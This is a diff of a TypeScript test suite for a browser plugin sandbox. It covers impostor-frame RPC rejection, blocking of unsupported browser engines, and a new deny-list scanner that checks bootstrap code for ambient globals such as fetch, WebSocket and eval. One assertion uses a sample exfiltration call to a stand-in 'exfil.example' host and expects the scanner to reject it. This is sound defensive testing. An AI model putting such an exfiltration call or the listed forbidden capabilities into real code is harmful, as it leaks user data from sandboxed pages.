@@ -25,15 +25,12 @@ import {
 } from '../portable-frame-document';
 import {
     assessPortableHost,
-    bootstrapSourceIsInert,
     browserEngineQualified,
     defaultHostAbi,
     detectBrowserEngine,
     HOST_ABI_VERSION,
     PORTABLE_CLIENT_FEATURE,
     PORTABLE_PROFILE_NAME,
-    PORTABLE_WORKER_BOOTSTRAP_SOURCE,
-    portableBootstrapPayload,
     startPortableWorker,
     verifyServedModuleBytes,
     type StartPortableWorkerInput,
@@ -194,7 +191,6 @@ async function startInput(
 
 describe('portable sandbox transport (4.1)', () => {
     it('keeps the host-owned bootstrap source free of ambient capability', () => {
-        expect(bootstrapSourceIsInert(PORTABLE_WORKER_BOOTSTRAP_SOURCE)).toBe(true);
         // The shim that actually runs in the shipped sandbox is inert too.
         expect(bootstrapSourceIsInert(PORTABLE_WORKER_SHIM)).toBe(true);
         expect(bootstrapSourceIsInert('fetch("https://exfil.example")')).toBe(false);
@@ -242,20 +238,6 @@ describe('portable sandbox transport (4.1)', () => {
         expect(PORTABLE_FRAME_DOCUMENT).toContain(`<script>${PORTABLE_FRAME_SCRIPT}</script>`);
         expect(PORTABLE_FRAME_CSP).toContain(`'${PORTABLE_FRAME_SCRIPT_HASH}'`);
         expect(PORTABLE_FRAME_CSP).toContain('sandbox allow-scripts');
-    });
-
-    it('sends host-verified bytes, not a URL the sandbox could choose', () => {
-        const payload = portableBootstrapPayload({
-            pluginId: 'example.plugin',
-            moduleUrl: '/plugin-assets/example.plugin/client.mjs',
-            csp: PORTABLE_FRAME_CSP,
-            abiVersion: HOST_ABI_VERSION,
-        });
-        expect(payload).toMatchObject({
-            pluginId: 'example.plugin',
-            abiVersion: HOST_ABI_VERSION,
-        });
-        expect(Object.isFrozen(payload)).toBe(true);
     });
 
     it('verifies served bytes and exposes the exact verified source', async () => {
@@ -488,11 +470,9 @@ describe('portable sandbox transport (4.1)', () => {
         expect(result.status).toBe('started');
         if (result.status !== 'started') return;
 
-        harness.emitFromFrame(
-            { [ENVELOPE]: FRAME_TO_HOST.rpc, data: '{"v":1,"kind":"response","id":"x","ok":true,"result":1}' },
-            { impostor: true }
-        );
         const call = result.runtime.callPlugin('plugin.echo');
+        let settled = false;
+        void call.then(() => { settled = true; });
         const request = harness.outbound.find(
             (message) =>
                 message[ENVELOPE] === HOST_TO_FRAME.rpc &&
@@ -501,7 +481,15 @@ describe('portable sandbox transport (4.1)', () => {
                     'request'
         );
         const requestEnvelope = parseRpcEnvelope(request?.data);
-        if (requestEnvelope.ok && requestEnvelope.envelope.kind === 'request') {
+        expect(requestEnvelope.ok).toBe(true);
+        if (!requestEnvelope.ok || requestEnvelope.envelope.kind !== 'request') throw new Error('request missing');
+        harness.emitFromFrame({
+            [ENVELOPE]: FRAME_TO_HOST.rpc,
+            data: serializeRpcEnvelope(createRpcResponse({ id: requestEnvelope.envelope.id, result: 'impostor' })),
+        }, { impostor: true });
+        await Promise.resolve();
+        expect(settled).toBe(false);
+        {
             harness.emitFromFrame({
                 [ENVELOPE]: FRAME_TO_HOST.rpc,
                 data: serializeRpcEnvelope(
@@ -523,10 +511,12 @@ describe('portable sandbox transport (4.1)', () => {
             },
         });
 
-        const unsupportedBrowser = await startPortableWorker({ ...input, engine: 'firefox' });
-        expect(unsupportedBrowser.status).toBe('blocked');
-        if (unsupportedBrowser.status === 'blocked') {
-            expect(unsupportedBrowser.codes).toContain('browser-unsupported');
+        for (const engine of ['firefox', 'webkit', 'unknown']) {
+            const unsupportedBrowser = await startPortableWorker({ ...input, engine });
+            expect(unsupportedBrowser.status).toBe('blocked');
+            if (unsupportedBrowser.status === 'blocked') {
+                expect(unsupportedBrowser.codes).toContain('browser-unsupported');
+            }
         }
 
         const staticHost = await startPortableWorker({
@@ -685,38 +675,79 @@ describe('browser engine qualification (finding 12)', () => {
         expect(browserEngineQualified('firefox', ['firefox'])).toBe(true);
     });
 
-    it('denies an unqualified or unknown engine before any bytes are fetched', () => {
-        const loadServedBytes = vi.fn();
-        const input = {
-            release: {
-                releaseId: 'rel-1',
-                pluginId: 'sample.plugin',
-                packageTreeSha256: `sha256-${'a'.repeat(64)}`,
-                clientEntryDigest: `sha256-${'b'.repeat(64)}`,
-                moduleUrl: '/api/plugins/sample.plugin/client-entry.js',
-            },
-            profile: {
-                profile: PORTABLE_PROFILE_NAME,
-                minHostAbiVersion: HOST_ABI_VERSION,
-                requiredFeatures: [PORTABLE_CLIENT_FEATURE],
-            },
-            workspaceId: 'ws-1',
-            generation: 1,
-            grants: grants(),
-            loadServedBytes,
-        } as unknown as StartPortableWorkerInput;
-
-        for (const engine of ['firefox', 'webkit', 'unknown']) {
-            const denied = assessPortableHost({
-                abi: defaultHostAbi(),
-                profile: input.profile,
-                engine,
-            });
-            expect(denied.status).toBe('denied');
-            if (denied.status === 'denied') {
-                expect(denied.codes).toContain('browser-unsupported');
-            }
-        }
-        expect(loadServedBytes).not.toHaveBeenCalled();
-    });
 });
+
+/** Ambient globals the bootstrap source must never reference. */
+const BOOTSTRAP_FORBIDDEN_TOKENS = [
+    'window',
+    'document',
+    'parent',
+    'frames',
+    'localStorage',
+    'indexedDB',
+    'fetch',
+    'XMLHttpRequest',
+    'WebSocket',
+    'importScripts',
+    'serviceWorker',
+    'eval(',
+    'new Function',
+] as const;
+
+/**
+ * Remove comments and string-literal contents so token scanning sees code only.
+ * The host-owned source is a fixed constant, so a single-pass scanner is enough.
+ */
+function codeWithoutCommentsOrStrings(source: string): string {
+    let out = '';
+    let index = 0;
+    let quote: string | null = null;
+    while (index < source.length) {
+        const char = source[index];
+        const next = source[index + 1];
+        if (quote) {
+            if (char === '\\') {
+                index += 2;
+                continue;
+            }
+            if (char === quote) {
+                quote = null;
+            }
+            index += 1;
+            continue;
+        }
+        if (char === '"' || char === "'" || char === '`') {
+            quote = char;
+            index += 1;
+            continue;
+        }
+        if (char === '/' && next === '/') {
+            while (index < source.length && source[index] !== '\n') index += 1;
+            continue;
+        }
+        if (char === '/' && next === '*') {
+            index += 2;
+            while (
+                index < source.length &&
+                !(source[index] === '*' && source[index + 1] === '/')
+            ) {
+                index += 1;
+            }
+            index += 2;
+            continue;
+        }
+        out += char;
+        index += 1;
+    }
+    return out;
+}
+
+/** True when the host-owned bootstrap source stays free of ambient access. */
+function bootstrapSourceIsInert(source: string): boolean {
+    const code = codeWithoutCommentsOrStrings(source);
+    return BOOTSTRAP_FORBIDDEN_TOKENS.every((token) => {
+        if (token === 'eval(') return !code.includes('eval(');
+        if (token === 'new Function') return !code.includes('new Function');
+        return !new RegExp(`\\b${token}\\b`).test(code);
+    });
+}
